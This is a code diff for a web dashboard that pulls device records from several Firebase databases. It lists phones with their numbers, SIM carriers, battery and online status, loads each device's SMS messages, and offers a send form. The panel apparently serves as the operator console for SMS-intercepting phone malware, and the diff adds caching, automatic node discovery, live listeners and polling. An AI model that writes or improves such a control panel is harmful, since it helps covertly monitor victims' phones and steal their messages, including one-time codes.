@@ -234,7 +234,8 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 .form-label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
 .form-input,.form-textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:15px;outline:none;margin-bottom:14px}
 .form-textarea{min-height:120px;resize:none;font-family:inherit}
-.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--success),#00cc7a);color:#050508;font-weight:800;font-size:15px;cursor:pointer}
+.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--ios-blue),#0066cc);color:#fff;font-weight:800;font-size:15px;cursor:pointer;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 20px rgba(10,132,255,.3)}
+.btn-send:active{transform:scale(.97)}
 .send-status{margin-top:10px;font-size:11px;font-family:'Space Mono',monospace;text-align:center}
 
 /* MORE */
@@ -373,7 +374,9 @@ var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[];
-var ACTIVE_FB_KEY='rbl_active_fb_m';
+var ACTIVE_FB_KEY='rbl_active_fb';
+var CLIENTS_CACHE_KEY='rbl_clients_cache_v3';
+var CLIENTS_CACHE_TTL=6*60*60*1000;
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
@@ -416,7 +419,7 @@ function initFirebaseInstance(cfg){
       db=firebase.app(appName).database();
     }catch(e){}
   }
-  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
+  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false,connError:'',pollTimer:null};
   firebaseInstances.push(inst);return inst;
 }
 function initFirebase(){
@@ -443,9 +446,10 @@ function updateFbUi(){
 function switchFirebase(id){
   if(!getFbInstance(id))return;
   activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
-  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
+  selDev='';clearListeners();
   updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
   closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
+  fetchAllData();
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
@@ -456,33 +460,170 @@ function getPhoneFromRecord(s){
   if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
   return String(s.phone_number||s.phone||s.mobile||'').trim();
 }
+function parseBattery(v){
+  if(v==null)return 0;
+  if(typeof v==='number')return v;
+  return parseInt(String(v).replace('%',''),10)||0;
+}
 function resolveOnlineStatus(s,fbId){
   var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
   if(schema==='rabel')return s.status===true||s.online===true;
   if(s.online_status===true)return true;if(s.online_status===false)return false;
   return s.online===true||s.status==='online'||s.status===true;
 }
+function isValidDeviceRecord(raw){
+  if(!raw||typeof raw!=='object'||Array.isArray(raw))return false;
+  if(raw.password||raw.Pass||raw.ExpDate||raw.expiry||raw.userName)return false;
+  if(raw.message&&raw.sender&&raw.dateTime)return false;
+  if(typeof raw.status==='boolean')return true;
+  if(!raw.modelName&&!raw.deviceId&&!raw.device_model&&!raw.device_info&&!raw.live_data&&!raw.name)return false;
+  return true;
+}
 function normalizeClientRecord(raw){
-  if(!raw||typeof raw!=='object')return null;
-  if(raw.password||raw.Pass)return null;
-  if(raw.modelName||raw.deviceId||raw.mobNo)return{
-    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
-    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
-    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
-  };
-  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
+  if(!isValidDeviceRecord(raw))return null;
+  if(raw.modelName||raw.deviceId||raw.mobNo){
+    var mob=getPhoneFromRecord(raw);
+    return{name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||raw.sdkV||'',
+      online:raw.status===true,status:raw.status,online_status:raw.status===true,
+      battery:parseBattery(raw.battery),network:raw.service_provider||(raw.sims&&raw.sims[0]?raw.sims[0].carrierName:'')||'?',
+      sms_count:raw.sms_count||0,mobNo:mob||raw.mobNo||''};
+  }
+  var r={name:raw.name||raw.device_model||'Unknown',brand:raw.brand||raw.device_brand||'',android:raw.android||raw.android_version||'',
     online_status:raw.online_status,online:raw.online,status:raw.status,
-    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
-    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
+    battery:parseBattery(raw.battery||raw.battery_level),network:raw.network||raw.network_type||'?',
+    sms_count:raw.sms_count||raw.smsCount||raw.total_sms||0,mobNo:getPhoneFromRecord(raw)};
+  r.online=resolveOnlineStatus(Object.assign({},raw,r),raw._fbId||'');
+  return r;
 }
 function ingestDeviceData(fbId,node,devId,data){
-  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
+  var payload=Object.assign({_fbId:fbId},data);
+  var norm=normalizeClientRecord(payload);if(!norm)return;
   norm._node=node;norm._fbId=fbId;
   clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
 }
 function mergeSummaryNode(fbId,node,raw){
   if(!raw||typeof raw!=='object')return;
   Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
+}
+function loadAllCaches(){
+  try{
+    var meta=JSON.parse(localStorage.getItem(CLIENTS_CACHE_KEY)||'null');
+    if(!meta||!meta.byFb)return false;
+    var loaded=false;
+    Object.keys(meta.byFb).forEach(function(fbId){
+      var entry=meta.byFb[fbId];
+      if(!entry||!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL)return;
+      Object.keys(entry.data).forEach(function(k){clientsRawMap[k]=entry.data[k];loaded=true;});
+    });
+    return loaded;
+  }catch(e){return false;}
+}
+function summaryFromParts(id,info,live,onlineStatus){
+  info=info||{};live=live||{};
+  var on=onlineStatus===true;
+  return{id:id,data:{
+    name:info.device_model||info.name||'Unknown',brand:info.device_brand||info.brand||'',
+    android:info.android_version||info.android||'',online:on,online_status:on,
+    battery:live.battery_level||live.battery||0,network:live.network_type||live.network||'?',
+    sms_count:live.total_sms||live.sms_count||0,mobNo:getPhoneFromRecord(info)||getPhoneFromRecord(live)
+  }};
+}
+function fetchOneDeviceSummary(inst,nodeName,id){
+  var base=inst.restUrl+'/'+nodeName+'/'+encodeURIComponent(id)+'/';
+  return Promise.all([restJson(base+'device_info.json'),restJson(base+'live_data.json'),restJson(base+'online_status.json')]).then(function(p){
+    var row=summaryFromParts(id,p[0],p[1],p[2]);
+    ingestDeviceData(inst.id,nodeName,row.id,row.data);
+  });
+}
+function fetchDevicesFast(inst,nodeName){
+  return restJson(inst.restUrl+'/'+nodeName+'.json?shallow=true').then(function(ids){
+    if(!ids||typeof ids!=='object')return;
+    var keys=Object.keys(ids);
+    if(!keys.length)return;
+    return Promise.all(keys.map(function(id){return fetchOneDeviceSummary(inst,nodeName,id);})).then(function(){processClientsData();});
+  });
+}
+function fetchSummaryNode(inst,node){
+  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){
+    if(!raw)return;
+    mergeSummaryNode(inst.id,node,raw);
+    processClientsData();
+  });
+}
+function fetchNodeViaSdk(inst,node){
+  if(!inst.db)return Promise.resolve();
+  return inst.db.ref(node).once('value').then(function(s){
+    if(!s.exists())return;
+    mergeSummaryNode(inst.id,node,s.val());
+    processClientsData();
+  });
+}
+function discoverViaSdk(inst){
+  if(!inst||!inst.db)return Promise.resolve(null);
+  var paths=['clients','devices','devices_status'];
+  return Promise.all(paths.map(function(p){
+    return inst.db.ref(p).limitToFirst(1).once('value').then(function(s){return s.exists()?p:null;}).catch(function(){return null;});
+  })).then(function(found){
+    found=found.filter(Boolean);
+    if(!found.length)return null;
+    var roots={};found.forEach(function(p){roots[p]=true;});
+    return roots;
+  });
+}
+function runDiscoveryTasks(inst,roots){
+  if(!roots||typeof roots!=='object')return Promise.resolve();
+  if(isFirebaseErr(roots)){inst.connError=String(roots.error);return Promise.resolve();}
+  inst.connError='';
+  var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0&&n!=='error';});
+  var tasks=[];
+  nodes.forEach(function(n){
+    if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
+    else if(n==='devices'||DEVICE_NODES.indexOf(n)>=0)tasks.push(fetchDevicesFast(inst,n));
+  });
+  if(!tasks.length)tasks.push(fetchNodeViaSdk(inst,'clients'),fetchNodeViaSdk(inst,'devices_status'));
+  return Promise.all(tasks);
+}
+function discoverAndFetchInstance(inst){
+  if(!inst)return Promise.resolve();
+  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
+    if(isFirebaseErr(roots)){
+      inst.connError=String(roots.error);
+      return discoverViaSdk(inst).then(function(sdkRoots){
+        if(sdkRoots)return runDiscoveryTasks(inst,sdkRoots);
+        return Promise.all([fetchNodeViaSdk(inst,'clients'),fetchNodeViaSdk(inst,'devices_status')]);
+      });
+    }
+    if(!roots||typeof roots!=='object'){
+      return discoverViaSdk(inst).then(function(sdkRoots){return runDiscoveryTasks(inst,sdkRoots||{});});
+    }
+    return runDiscoveryTasks(inst,roots);
+  }).catch(function(){
+    return discoverViaSdk(inst).then(function(sdkRoots){
+      if(sdkRoots)return runDiscoveryTasks(inst,sdkRoots);
+      return Promise.all([fetchNodeViaSdk(inst,'clients'),fetchNodeViaSdk(inst,'devices_status')]);
+    });
+  });
+}
+function attachLive(inst){
+  if(!inst.db||inst.liveAttached)return;
+  inst.liveAttached=true;
+  ['clients','devices_status'].forEach(function(node){
+    inst.db.ref(node).once('value').then(function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
+    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
+    inst.db.ref(node).on('child_added',function(s){ingestDeviceData(inst.id,node,s.key,s.val());processClientsData();});
+    inst.db.ref(node).on('child_changed',function(s){ingestDeviceData(inst.id,node,s.key,s.val());processClientsData();});
+  });
+}
+function attachRestPolling(inst){
+  if(inst.pollTimer)return;
+  var poll=function(){
+    if(inst.db){fetchNodeViaSdk(inst,'clients');fetchNodeViaSdk(inst,'devices_status');}
+    else{
+      restJson(inst.restUrl+'/clients.json').then(function(raw){if(raw){mergeSummaryNode(inst.id,'clients',raw);processClientsData();}});
+    }
+  };
+  poll();
+  inst.pollTimer=setInterval(poll,inst.schema==='rabel'?8000:12000);
 }
 function processClientsData(){
   allDevs=[];
@@ -509,33 +650,20 @@ function updateStats(){
   bumpStat('stTotal',t);bumpStat('stOnline',o);bumpStat('stOffline',f);
   _lastStats={t:t,o:o,f:f};
 }
-function fetchSummaryNode(inst,node){
-  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
-}
-function discoverInstance(inst){
-  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
-    if(!roots||typeof roots!=='object')return;
-    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
-    var tasks=[];
-    nodes.forEach(function(n){
-      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
-      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
-    });
-    return Promise.all(tasks);
-  });
-}
-function attachLive(inst){
-  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
-  ['clients','devices_status'].forEach(function(node){
-    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
-  });
-}
 function fetchAllData(){
+  var inst=getFbInstance(activeFbId);
+  if(!inst){toast('No Firebase selected',false);return Promise.resolve();}
   document.getElementById('hdrSub').textContent='Syncing...';
-  firebaseInstances.forEach(attachLive);
-  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
+  var hadCache=loadAllCaches();
+  if(hadCache)processClientsData();
+  firebaseInstances.forEach(function(i){if(i.pollTimer){clearInterval(i.pollTimer);i.pollTimer=null;}});
+  if(!inst.liveAttached){attachLive(inst);attachRestPolling(inst);}
+  return discoverAndFetchInstance(inst).then(function(){
     processClientsData();
-    document.getElementById('hdrSub').textContent=getFilteredDevs().length+' devices';
+    var cnt=getFilteredDevs().length;
+    var err=inst.connError;
+    document.getElementById('hdrSub').textContent=cnt?cnt+' devices · '+inst.name:(err?'Error · '+inst.name:inst.name);
+    if(!cnt&&err)toast('Firebase: '+err,false);
     if(selDev)loadSmsForDevice();
   });
 }
@@ -564,7 +692,7 @@ function iphoneShellHtml(d,i,large){
     '<div class="iphone-screen">'+
     '<div class="iphone-island"></div>'+
     '<div class="ios-status-top"><span class="ios-time">'+iosTime()+'</span>'+
-    '<div class="ios-status-icons">'+iosSignalHtml()+iosBatteryHtml(bat,large)+'</div></div>'+
+    '<div class="ios-status-icons">'+iosSignalHtml()+iosBatteryHtml(d.battery||0,large)+'</div></div>'+
     '<div class="ios-lock-icon">🔒</div>'+
     '<div class="ios-screen-phone">'+esc(d.displayPhone)+'</div>'+
     '<div class="ios-screen-model">'+esc(iosModel(d,i))+'</div>'+
@@ -582,7 +710,12 @@ function renderDevices(){
   var q=(document.getElementById('devSearch').value||'').toLowerCase();
   var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
   var el=document.getElementById('devList');
-  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📱</div>No iOS devices yet<br><span style="font-size:11px;opacity:.6">Syncing Firebase...</span></div>';return;}
+  if(!list.length){
+    var inst=getFbInstance(activeFbId);
+    var err=inst&&inst.connError?('<br><span style="font-size:10px;color:var(--error);margin-top:8px;display:block">'+esc(inst.connError)+'</span>'):'';
+    el.innerHTML='<div class="empty-state"><div class="ico">📱</div>No devices on '+(inst?esc(inst.name):'Firebase')+'<br><span style="font-size:11px;opacity:.6">Tap ↻ refresh · check Firebase switcher</span>'+err+'</div>';
+    return;
+  }
   window._devList=list;
   el.innerHTML=list.map(function(d,i){
     var delay=Math.min(i*0.06,0.4);
